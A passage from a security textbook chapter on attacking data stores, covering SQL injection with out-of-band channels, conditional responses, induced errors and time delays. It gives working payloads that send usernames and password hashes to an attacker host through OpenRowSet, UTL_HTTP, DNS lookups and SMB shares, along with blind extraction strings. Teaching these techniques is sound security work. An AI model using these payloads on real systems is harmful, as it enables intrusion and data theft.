excellent guide to these differences covering many different databases can be
found at http://sqlzoo.net/howto/source/z.dir/i08fun.xml.
In a variation on this situation, the authors have encountered cases in which
what is returned by the application is not an actual number, but a resource for
which that number is an identifi er. The application performs a SQL query based
on user input, obtains a numeric identifi er for a document, and then returns the
document’s contents to the user. In this situation, an attacker can fi rst obtain
a copy of every document whose identifi ers are within the relevant numeric
range and construct a mapping of document contents to identifi ers. Then, when
performing the attack described previously, the attacker can consult this map to
determine the identifi er for each document received from the application and
thereby retrieve the ASCII value of the character he has successfully extracted.
Using an Out-of-Band Channel
In many cases of SQL injection, the application does not return the results of
any injected query to the user’s browser, nor does it return any error messages
generated by the database. In this situation, it may appear that your position is
futile. Even if a SQL injection fl aw exists, it surely cannot be exploited to extract
arbitrary data or perform any other action. This appearance is false, however.
You can try various techniques to retrieve data and verify that other malicious
actions have been successful.
There are many circumstances in which you may be able to inject an arbitrary
query but not retrieve its results. Recall the example of the vulnerable login
form, where the username and password fi elds are vulnerable to SQL injection:
SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’
In addition to modifying the query’s logic to bypass the login, you can inject
an entirely separate subquery using string concatenation to join its results to
the item you control. For example:
foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE
username = ‘DBSNMP’) = ‘DBSNMP’)--
This causes the application to perform the following query:
SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE
(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)
cc0099..iinndddd 331166 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 317
Chapter 9 n Attacking Data Stores 317
The database executes your arbitrary subquery, appends its results to foo,
and then looks up the details of the resulting username. Of course, the login
will fail, but your injected query will have been executed. All you will receive
back in the application’s response is the standard login failure message. What
you then need is a way to retrieve the results of your injected query.
A different situation arises when you can employ batch queries against MS-SQL
databases. Batch queries are extremely useful, because they allow you to execute
an entirely separate statement over which you have full control, using a different
SQL verb and targeting a different table. However, because of how batch queries
are carried out, the results of an injected query cannot be retrieved directly.
Again, you need a means of retrieving the lost results of your injected query.
One method for retrieving data that is often effective in this situation is to
use an out-of-band channel. Having achieved the ability to execute arbitrary
SQL statements within the database, it is often possible to leverage some of the
database’s built-in functionality to create a network connection back to your own
computer, over which you can transmit arbitrary data that you have gathered
from the database.
The means of creating a suitable network connection are highly database-
dependent. Different methods may or may not be available given the privilege
level of the database user with which the application is accessing the database.
Some of the most common and effective techniques for each type of database
are described here.
MS-SQL
On older databases such as MS-SQL 2000 and earlier, the OpenRowSet command
can be used to open a connection to an external database and insert arbitrary
data into it. For example, the following query causes the target database to open
a connection to the attacker’s database and insert the version string of the target
database into the table called foo:
insert into openrowset(‘SQLOLEDB’,
‘DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein’,
‘select * from foo’) values (@@version)
Note that you can specify port 80, or any other likely value, to increase your
chance of making an outbound connection through any fi rewalls.
Oracle
Oracle contains a large amount of default functionality that is accessible by
low-privileged users and that can be used to create an out-of-band connection.
The UTL_HTTP package can be used to make arbitrary HTTP requests to other
hosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies,
redirects, and authentication. This means that an attacker who has compromised
cc0099..iinndddd 331177 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 318
318 Chapter 9 n Attacking Data Stores
a database on a highly restricted internal corporate network may be able to
leverage a corporate proxy to initiate outbound connections to the Internet.
In the following example, UTL_HTTP is used to transmit the results of an
injected query to a server controlled by the attacker:
/employees.asp?EmpNo=7521’||UTL_HTTP.request(‘mdattacker.net:80/’||
(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
This URL causes UTL_HTTP to make a GET request for a URL containing the
fi rst username in the table all_users. The attacker can simply set up a netcat
listener on mdattacker.net to receive the result:
C:\>nc -nLp 80
GET /SYS HTTP/1.1
Host: mdattacker.net
Connection: close
The UTL_INADDR package is designed to be used to resolve hostnames to IP
addresses. It can be used to generate arbitrary DNS queries to a server con-
trolled by the attacker. In many situations, this is more likely to succeed than
the UTL_HTTP attack, because DNS traffi c is often allowed out through corporate
fi rewalls even when HTTP traffi c is restricted. The attacker can leverage this
package to perform a lookup on a hostname of his choice, effectively retrieving
arbitrary data by prepending it as a subdomain to a domain name he controls.
For example:
/employees.asp?EmpNo=7521’||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%
20FROM%20DBA_USERS%20WHERE%20NAME=’SYS’)||’.mdattacker.net’)
This results in a DNS query to the mdattacker.net name server containing
the SYS user’s password hash:
DCB748A5BC5390F2.mdattacker.net
The UTL_SMTP package can be used to send e-mails. This facility can be used
to retrieve large volumes of data captured from the database by sending this
in outbound e-mails.
The UTL_TCP package can be used to open arbitrary TCP sockets to send and
receive network data.
NOTE On Oracle 11g, an additional ACL protects many of the resources just
described from execution by any arbitrary database user. An easy way around
this is to dip into the new functionality provided in Oracle 11g and use this code:
SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE
NAME=’SYS’)||’.mdsec.net’,80)
cc0099..iinndddd 331188 88//1199//22001111 1122::0099::3311 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 319
Chapter 9 n Attacking Data Stores 319
MySQL
The SELECT ... INTO OUTFILE command can be used to direct the output from
an arbitrary query into a fi le. The specifi ed fi lename may contain a UNC path,
enabling you to direct the output to a fi le on your own computer. For example:
select * into outfile ‘\\\\mdattacker.net\\share\\output.txt’ from users;
To receive the fi le, you need to create an SMB share on your computer that
allows anonymous write access. You can confi gure shares on both Windows
and UNIX-based platforms to behave in this way. If you have diffi culty receiv-
ing the exported fi le, this may result from a confi guration issue in your SMB
server. You can use a sniffer to confi rm whether the target server is initiating
any inbound connections to your computer. If it is, consult your server docu-
mentation to ensure that it is confi gured correctly.
Leveraging the Operating System
It is often possible to perform escalation attacks via the database that result in
execution of arbitrary commands on the operating system of the database server
itself. In this situation, many more avenues are available to you for retrieving
data, such as using built-in commands like tftp,mail, and telnet, or copying
data into the web root for retrieval using a browser. See the later section “Beyond
SQL Injection” for techniques for escalating privileges on the database itself.
Using Inference: Conditional Responses
There are many reasons why an out-of-band channel may be unavailable. Most
commonly this occurs because the database is located within a protected net-
work whose perimeter fi rewalls do not allow any outbound connections to the
Internet or any other network. In this situation, you are restricted to accessing
the database entirely via your injection point into the web application.
In this situation, working more or less blind, you can use many techniques
to retrieve arbitrary data from within the database. These techniques are all
based on the concept of using an injected query to conditionally trigger some
detectable behavior by the database and then inferring a required item of infor-
mation on the basis of whether this behavior occurs.
Recall the vulnerable login function where the username and password fi elds
can be injected into to perform arbitrary queries:
SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’
Suppose that you have not identifi ed any method of transmitting the results
of your injected queries back to the browser. Nevertheless, you have already
seen how you can use SQL injection to modify the application’s behavior.
cc0099..iinndddd 331199 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 320
320 Chapter 9 n Attacking Data Stores
For example, submitting the following two pieces of input causes very differ-
ent results:
admin’ AND 1=1--
admin’ AND 1=2--
In the fi rst case, the application logs you in as the admin user. In the second
case, the login attempt fails, because the 1=2 condition is always false. You
can leverage this control of the application’s behavior as a means of inferring
the truth or falsehood of arbitrary conditions within the database itself. For
example, using the ASCII and SUBSTRING functions described previously, you
can test whether a specifi c character of a captured string has a specifi c value. For
example, submitting this piece of input logs you in as the admin user, because
the condition tested is true:
admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--
Submitting the following input, however, results in a failed login, because
the condition tested is false:
admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--
By submitting a large number of such queries, cycling through the range
of likely ASCII codes for each character until a hit occurs, you can extract the
entire string, one byte at a time.
Inducing Conditional Errors
In the preceding example, the application contained some prominent function-
ality whose logic could be directly controlled by injecting into an existing SQL
query. The application’s designed behavior (a successful versus a failed login)
could be hijacked to return a single item of information to the attacker. However,
not all situations are this straightforward. In some cases, you may be injecting
into a query that has no noticeable effect on the application’s behavior, such
as a logging mechanism. In other cases, you may be injecting a subquery or a
batched query whose results are not processed by the application in any way.
In this situation, you may struggle to fi nd a way to cause a detectable difference
in behavior that is contingent on a specifi ed condition.
David Litchfi eld devised a technique that can be used to trigger a detect-
able difference in behavior in most circumstances. The core idea is to inject
a query that induces a database error contingent on some specifi ed condi-
tion. When a database error occurs, it is often externally detectable, either
through an HTTP 500 response code or through some kind of error message
or anomalous behavior (even if the error message itself does not disclose any
useful information).
cc0099..iinndddd 332200 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 321
Chapter 9 n Attacking Data Stores 321
The technique relies on a feature of database behavior when evaluating con-
ditional statements: the database evaluates only those parts of the statement
that need to be evaluated given the status of other parts. An example of this
behavior is a SELECT statement containing a WHERE clause:
SELECT X FROM Y WHERE C
This causes the database to work through each row of table Y, evaluating
condition C, and returning X in those cases where condition C is true. If condi-
tion C is never true, the expression X is never evaluated.
This behavior can be exploited by fi nding an expression X that is syntactically
valid but that generates an error if it is ever evaluated. An example of such an
expression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0.
If condition C is ever true, expression X is evaluated, causing a database error.
If condition C is always false, no error is generated. You can, therefore, use the
presence or absence of an error to test an arbitrary condition C.
An example of this is the following query, which tests whether the default
Oracle user DBSNMP exists. If this user exists, the expression 1/0 is evaluated,
causing an error:
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
‘DBSNMP’) = ‘DBSNMP’
The following query tests whether an invented user AAAAAA exists. Because
the WHERE condition is never true, the expression 1/0 is not evaluated, so no
error occurs:
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
‘AAAAAA’) = ‘AAAAAA’
What this technique achieves is a way of inducing a conditional response
within the application, even in cases where the query you are injecting has no
impact on the application’s logic or data processing. It therefore enables you
to use the inference techniques described previously to extract data in a wide
range of situations. Furthermore, because of the technique’s simplicity, the same
attack strings will work on a range of databases, and where the injection point
is into various types of SQL statements.
This technique is also versatile because it can be used in all kinds of injection
points where a subquery can be injected. For example:
(select 1 where > or 1/0=0)
Consider an application that provides a searchable and sortable contacts
database. The user controls the parameters department and sort:
/search.jsp?department=30&sort=ename
cc0099..iinndddd 332211 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 322
322 Chapter 9 n Attacking Data Stores
This appears in the following back-end query, which parameterizes the depart-
ment parameter but concatenates the sort parameter onto the query:
String queryText = “SELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ?
ORDER BY “ + request.getParameter(“sort”) + “ DESC”;
It is not possible to alter the WHERE clause, or issue a UNION query after an ORDER
BY clause; however, an attacker can create an inference condition by issuing the
following statement:
/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20
(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=’Y’)
If the fi rst letter of the fi rst object name in the user_objects table is equal
to ‘Y’, this will cause the database to attempt to evaluate 1/0. This will result
in an error, and no results will be returned by the overall query. If the letter
is not equal to ‘Y’, results from the original query will be returned in the
default order. Carefully supplying this condition to an SQL injection tool
such as Absinthe or SQLMap, we can retrieve every record in the database.
Using Time Delays
Despite all the sophisticated techniques already described, there may yet be
situations in which none of these tricks are effective. In some cases, you may
be able to inject a query that returns no results to the browser, cannot be used
to open an out-of-band channel, and that has no effect on the application’s
behavior, even if it induces an error within the database itself.
In this situation, all is not lost, thanks to a technique invented by Chris Anley
and Sherief Hammad of NGSSoftware. They devised a way of crafting a query
that would cause a time delay, contingent on some condition specifi ed by the
attacker. The attacker can submit his query and then monitor the time taken for
the server to respond. If a delay occurs, the attacker may infer that the condi-
tion is true. Even if the actual content of the application’s response is identical
in the two cases, the presence or absence of a time delay enables the attacker to
extract a single bit of information from the database. By performing numerous
such queries, the attacker can systematically retrieve arbitrarily complex data
from the database one bit at a time.
The precise means of inducing a suitable time delay depends on the target
database being used. MS-SQL contains a built-in WAITFOR command, which can
be used to cause a specifi ed time delay. For example, the following query causes
a time delay of 5 seconds if the current database user is sa:
if (select user) = ‘sa’ waitfor delay ‘0:0:5’
cc0099..iinndddd 332222 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 323
Chapter 9 n Attacking Data Stores 323
Equipped with this command, the attacker can retrieve arbitrary informa-
tion in various ways. One method is to leverage the same technique already
described for the case where the application returns conditional responses.
Now, instead of triggering a different application response when a particular
condition is detected, the injected query induces a time delay. For example, the
second of these queries causes a time delay, indicating that the fi rst letter of the
captured string is A:
if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’
if ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’
As before, the attacker can cycle through all possible values for each character
until a time delay occurs. Alternatively, the attack could be made more effi cient
by reducing the number of requests needed. An additional technique is to break
each byte of data into individual bits and retrieve each bit in a single query. The
POWER command and the bitwise AND operator & can be used to specify condi-
tions on a bit-by-bit basis. For example, the following query tests the fi rst bit of
the fi rst byte of the captured data and pauses if it is 1:
if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay ‘0:0:5’
The following query performs the same test on the second bit:
if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay ‘0:0:5’
As mentioned earlier, the means of inducing a time delay are highly database-
dependent. In current versions of MySQL, the sleep function can be used to
create a time delay for a specifi ed number of milliseconds:
select if(user() like ‘root@%’, sleep(5000), ‘false’)
In versions of MySQL prior to 5.0.12, the sleep function cannot be used. An